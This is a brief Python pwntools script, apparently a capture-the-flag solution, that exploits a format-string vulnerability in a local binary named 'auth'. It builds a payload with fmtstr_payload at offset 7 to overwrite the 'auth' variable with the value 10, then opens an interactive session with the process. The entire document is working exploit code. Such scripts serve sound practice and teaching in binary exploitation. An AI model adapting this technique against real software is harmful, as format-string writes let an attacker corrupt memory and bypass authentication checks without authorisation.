from pwn import *

elf = context.binary = ELF("./auth")
p = process()

offset = 7
payload = flat([
    elf.sym["auth"],
    b"A" * 6,
    f"%{offset}$n",
])

payload = fmtstr_payload(offset,{elf.sym["auth"]: 10})



p.sendline(payload)
p.interactive()


